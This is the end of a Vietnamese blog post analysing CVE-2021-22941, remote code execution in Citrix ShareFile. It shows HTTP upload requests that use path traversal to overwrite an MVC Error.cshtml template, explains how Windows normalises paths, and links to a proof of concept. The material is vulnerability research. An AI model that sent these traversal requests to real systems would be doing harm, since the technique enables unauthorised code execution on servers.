</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/upload.aspx?id=../foo&amp;bp=bp&amp;accountId=123</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>localhost</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>4240</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=b74bf37b7d0548a0280c058e21597abd</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--b74bf37b7d0548a0280c058e21597abd
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;name&#34;; filename=&#34;filename&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;4096 chữ A ở đây nhé&gt;
</span></span><span class=line><span class=cl>--b74bf37b7d0548a0280c058e21597abd--
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=https://images.viblo.asia/193044a8-79f7-4ef3-a21e-ba645f64268d.png alt=image.png></p><p>Và ta nhận được file <code>foo</code> đã nhảy ra bên ngoài folder <code>content</code> với nội dung như trên hình.</p><p>Ờ thì giờ path travesal được rồi thì làm sao nhở, sau đọc bài của code white, họ đã có gợi ý cho mình là sử dụng ghi đè lên file template của mô hình MVC <code>.cshtml</code> để có thể kích hoạt lên shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/upload.aspx?id=..%2FConfigService%2FViews%2FShared%2FError.cshtml&amp;bp=bp&amp;accountId=123z</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>localhost</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>4240</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=4b6955d42c8c6d258f047410fbb3fc12</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--4b6955d42c8c6d258f047410fbb3fc12
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;name&#34;; filename=&#34;filename&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;4096 chữ A ở đây nhé&gt;
</span></span><span class=line><span class=cl>--4b6955d42c8c6d258f047410fbb3fc12--
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=https://images.viblo.asia/0a7b51b5-25c8-4727-bd86-149d0caa5f63.png alt=image.png></p><p>Ngon roài, vậy giờ mình có thể ghi đè lên file <code>Error.cshtml</code>, tuy nhiên giờ data mình truyền vào duy nhất là biến <code>id</code> mà thôi, sau một hồi đọc gợi ý của code white mà mình mơ mơ màng màng chẳng hiểu gì cả. Nhưng mà sau vẫn lĩnh hội được 😁</p><h3 id=tạo-payload>Tạo payload<a hidden class=anchor aria-hidden=true href=#tạo-payload>#</a></h3><p>Giải thích thế này một chút cho dễ hiểu, trên Linux và Windows, việc chuẩn hoá PATH là khác nhau. Ví dụ:</p><ul><li>Linux: <code>cd a/b/c/</code> thì Linux sẽ kiểm tra path <code>a</code>, path <code>a/b</code>, path <code>a/b/c</code> có tồn tại hay không, nếu có thì thực hiện lệnh thành công.</li><li>Windows: <code>cd a/b/c</code> thì Windows sẽ thực hiện chuẩn hoá path <code>a/b/c</code> xem có tồn tại hay không, nếu có thì thực hiện lệnh thành công.</li></ul><p>Vậy bạn thử <code>cd aaa/../a/b/c</code> trên Linux và Windows xem, trên Windows thì chạy được lệnh này còn Linux báo k có directory nào tồn tại ngay 😂. Vì Linux nó sẽ kiểm tra folder <code>aaa/</code> có tồn tại không đã, rồi nó mới chạy tiếp, nếu k tồn tại thì thôi, Windows lại khác, <code>aaa/.../a/b/c => a/b/c</code> có tồn tại thì chạy được bình thường.</p><p>Bây giờ chúng ta cần viết ra 1 cái template file <code>.cshtml</code> để có thể chạy shell trên này, không được chứa các ký tự</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=o>&lt;</span> <span class=p>(</span><span class=n>less</span> <span class=n>than</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>&gt;</span> <span class=p>(</span><span class=n>greater</span> <span class=n>than</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>:</span> <span class=p>(</span><span class=n>colon</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=s>&#34; (double quote)</span>
</span></span><span class=line><span class=cl><span class=o>/</span> <span class=p>(</span><span class=n>forward</span> <span class=n>slash</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=err>\</span> <span class=p>(</span><span class=n>backslash</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=p>(</span><span class=n>vertical</span> <span class=n>bar</span> <span class=n>or</span> <span class=n>pipe</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>?</span> <span class=p>(</span><span class=n>question</span> <span class=n>mark</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=p>(</span><span class=n>asterisk</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>Theo <a href=https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#naming-conventions>https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#naming-conventions</a></p></blockquote><p>Mình có viết 1 mã PoC ở đây, các bạn có thể tham khảo qua nhé :D<br><a href=https://github.com/sun-asterisk-research/cybersec-pocs/tree/master/citrix_sharefile>https://github.com/sun-asterisk-research/cybersec-pocs/tree/master/citrix_sharefile</a></p><h1 id=tham-khảo>Tham khảo<a hidden class=anchor aria-hidden=true href=#tham-khảo>#</a></h1><ul><li><a href=https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#naming-conventions>https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#naming-conventions</a></li><li><a href=https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html>https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html</a></li><li><a href=https://github.com/hoavt184/CVE-2021-22941>https://github.com/hoavt184/CVE-2021-22941</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/rce/>RCE</a></li><li><a href=https://minhtuanact.github.io/tags/khaibutdauxuan/>KhaiButDauXuan</a></li><li><a href=https://minhtuanact.github.io/tags/citrix-sharefile/>Citrix Sharefile</a></li><li><a href=https://minhtuanact.github.io/tags/cve-2021-22941/>CVE-2021-22941</a></li></ul><nav class=paginav><a class=prev href=https://minhtuanact.github.io/posts/phai-lam-gi-khi-ports-are-not-available-tren-dockercac-service-khac/><span class=title>« Prev</span><br><span>Phải làm gì khi "Ports are not available" trên Docker/các service khác 🤧</span></a>
<a class=next href=https://minhtuanact.github.io/posts/setup-debug-gitlab-tuong-khong-kho-ma-cung-khong-kho-lam/><span class=title>Next »</span><br><span>Setup debug Gitlab, tưởng không khó mà cũng không khó lắm</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Phân tích CVE-2021-22941, RCE Citrix Sharefile  on twitter" href="https://twitter.com/intent/tweet/?text=Ph%c3%a2n%20t%c3%adch%20CVE-2021-22941%2c%20RCE%20Citrix%20Sharefile%20%3c%205.11.20&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fphan-tich-cve-2021-22941-rce-citrix-sharefile-51120%2f&hashtags=RCE%2cKhaiButDauXuan%2cCitrixSharefile%2cCVE-2021-22941"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Phân tích CVE-2021-22941, RCE Citrix Sharefile  on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fphan-tich-cve-2021-22941-rce-citrix-sharefile-51120%2f&title=Ph%c3%a2n%20t%c3%adch%20CVE-2021-22941%2c%20RCE%20Citrix%20Sharefile%20%3c%205.11.20&summary=Ph%c3%a2n%20t%c3%adch%20CVE-2021-22941%2c%20RCE%20Citrix%20Sharefile%20%3c%205.11.20&source=https%3a%2f%2fminhtuanact.github.io%2fposts%2fphan-tich-cve-2021-22941-rce-citrix-sharefile-51120%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Phân tích CVE-2021-22941, RCE Citrix Sharefile  on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fphan-tich-cve-2021-22941-rce-citrix-sharefile-51120%2f&title=Ph%c3%a2n%20t%c3%adch%20CVE-2021-22941%2c%20RCE%20Citrix%20Sharefile%20%3c%205.11.20"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Phân tích CVE-2021-22941, RCE Citrix Sharefile  on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fphan-tich-cve-2021-22941-rce-citrix-sharefile-51120%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Phân tích CVE-2021-22941, RCE Citrix Sharefile  on whatsapp" href="https://api.whatsapp.com/send?text=Ph%c3%a2n%20t%c3%adch%20CVE-2021-22941%2c%20RCE%20Citrix%20Sharefile%20%3c%205.11.20%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2fphan-tich-cve-2021-22941-rce-citrix-sharefile-51120%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Phân tích CVE-2021-22941, RCE Citrix Sharefile  on telegram" href="https://telegram.me/share/url?text=Ph%c3%a2n%20t%c3%adch%20CVE-2021-22941%2c%20RCE%20Citrix%20Sharefile%20%3c%205.11.20&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fphan-tich-cve-2021-22941-rce-citrix-sharefile-51120%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>